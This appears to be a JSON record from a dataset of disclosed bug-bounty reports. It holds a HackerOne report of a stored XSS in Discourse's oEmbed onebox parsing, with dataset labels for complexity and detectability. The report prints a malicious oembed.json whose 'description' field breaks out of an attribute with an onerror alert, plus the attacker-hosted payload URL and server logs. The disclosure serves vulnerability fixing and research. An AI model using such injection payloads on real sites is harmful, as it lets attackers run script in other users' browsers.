@@ -1,0 +1,47 @@
+{
+  "reported_to": "Discourse",
+  "reported_by": "skavans ",
+  "title": "Stored XSS in posts because of absence of oembed variables values escaping",
+  "content": "\nHello!\nSteps to reproduce:\nPaste this payload URL in the post: http://89.223.28.48/oembed_video.html?uncache\nSave the post and you will see the XSS will fire.\n<image_0>\nThe vulnerability exists because of absence of oembed variables values escaping.\nThere is the oembed link in the payload page:\nCode 76 Bytes\n1<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>\nAs you can see the onebox parser goes to this oembed URL to get the data:\nCode 193 Bytes\n164.71.168.198 - - [12/Jan/2017:19:13:52 +0000] \"GET /oembed_video.html HTTP/1.1\" 200 388 \"-\" \"Ruby\"\n264.71.168.198 - - [12/Jan/2017:19:13:52 +0000] \"GET /oembed.json HTTP/1.1\" 200 389 \"-\" \"Ruby\"\nThe content of oembed.json is:\nCode 170 Bytes\n1{\n2        \"type\": \"image\",\n3        \"image\": \"xss\",\n4        \"description\": \"descr' onerror='alert(/XSS by skavans/)\",\n5        \"image_width\": 1,\n6        \"image_height\": 1\n7}\nSo the unescaped data is injected in the raw HTML at this line of generic_whitelisted onebox engine that leads to XSS vulnerability.\nThe example post with stored XSS inside is: https://try.discourse.org/t/this-is-just-one-test/632\nPlease let me know if you need some extra information to locate and fix the bug.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/151/922/97113a6f1c3c6556842771e954d0b7f4ca2f9298/______________2017-01-12___22.17.11.png?response-content-disposition=attachment%3B%20filename%3D%22______________2017-01-12___22.17.11.png%22%3B%20filename%2A%3DUTF-8%27%27______________2017-01-12___22.17.11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWZ7RUKE%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T233107Z&X-Amz-Expires=958&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGLSnYZfjMhCa0dN2OqzDAJnkOYTveMT%2B7eL0ajEFw5VAiBTVMNZnWgQxabUGEJ2Qswux%2FO5eu3GMgZoinMxWoNlQyqyBQgzEAMaDDAxMzYxOTI3NDg0OSIM6M7yzHfnJUoeDTsMKo8FtzcS1Zhg0qp8B14U4w500OCBCvP45LznD6a7p9TD4f7ryHdqKBeJzEGwvrlSUkJPelPrLg6rw9svX1OYdYEyggGoqMi4JwXiXe1683fOyYLlI790nFEfc6QY07n9AMZCc4jMw3i6UmLmzls9z2XhQ0PymKzOhJIIOJfaHjVY7WLjnp22kePhrLI9lIB3na5a4S2Fi47pY0kdP7FnY1nRHXtcuOwSKXwSDbgvM0FJJyfRj9mbkHaC3SVKaTvcStLUXs9BUJ5J2YNNDNRA%2BmvTJmb4SS%2FP4v4MSc%2FXiT0117Mg9Lv4Q%2FMi14W9WBRioV3i2UK5bXy%2B1po78ADnHWKHfSYDA%2BbP2PGsB50NyI4bV0Mza5T8ijs%2FIdZpO%2FLjIc4xWgjgmNpaALz3wWVIxLmC22p8UeWoJyrJOn68GuMfdYMGxSEq0YdnKfb3KJdc6WmA%2FWyl69pwN%2FVuYdREiEm3HnH9%2FL8NDg2T%2F5Otofwk6cvsJ9EHeuoD0Edkh0K%2B55bNJlu58PMexhiXh%2FlkTnb1nPU7lHV1tYh7s0LlQtgUs4Alfy0CNVK0hStQO2vakt1kfSdfdmJ5nyFZm2IY3ghv5zdqilqW8p%2Fo1UzOIRQ2vGsOinL8uOjHVwEJCWeFDJryZnmZB0eNVAP77RQn%2BYLUAtzFKnWY6xwq2qhe3I6pjcNM%2BKjbDbV3%2Bv3UwCKYxvRSpxGySMLWbEuR534iZLEAatx3K0P0y6gCDkRcN3OVcRPnFwvoS33Y6kq1l6bHKs%2FlsUt3PgdIlMwzFAgSaFiu3K08peraU3v5CaSgrhnS8smV5T0h8igQaHCjVhHVj6lNL26WM7cHMmWOLKGjMF6aWPNIcwU9TGohc%2F7capR0%2BDCH85C%2FBjqyAVpmoFAXjeHhdELw8Ed%2BcnC0QCu8ayNQH0MJUt2bahdqrabTYW3OIILox52lE62WsOn5tGIGjZ4eVnG0rWW%2BG6XsNR%2F14vDh9jbowcfsizhSbPljvYSVtZaEA1RqBmHNYFiTz1xp%2FjFnQ0yqILATHwUudn1pgu2%2Fz6qUSwQMMRCSpKMYfQ3Ncun5w%2BQx9MLEz8HP63nzr%2F0m4%2FVXwRs44Q37rNPr3Qyq7e%2FpnbxKfH8fFkg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=11d8afa5f0f00b2f1ca1cbdbf7a4c3c727eaee7c1cb37783c76d02dd8d95dcba"
+  },
+  "disclosed_date": 1484974200,
+  "report_url": "https://hackerone.com/reports/197914",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Paste the payload URL 'http://89.223.28.48/oembed_video.html?uncache' into a post."
+    ],
+    [
+      2,
+      "Save the post to trigger the XSS payload when the post is viewed."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a stored XSS in posts due to the absence of escaping in oembed variable values. When a malicious oembed URL is embedded in a post, it fetches JSON data that contains unescaped JavaScript, which is then executed in the context of the page when the post is viewed.",
+  "reason": "The attack involves understanding the oembed protocol and crafting a malicious JSON response that includes unescaped JavaScript. While the components are straightforward (oembed URL and JSON response), the interaction between them is non-obvious as it requires knowledge of how the onebox parser processes oembed data and injects it into the page.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves stored XSS due to unescaped oembed variables, which is not related to authentication or authorization (AuthN/AuthZ) issues. The described methodology focuses on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by testing user sessions and resource access, not input validation or XSS vulnerabilities.",
+    "is_detectable": false
+  }
+}
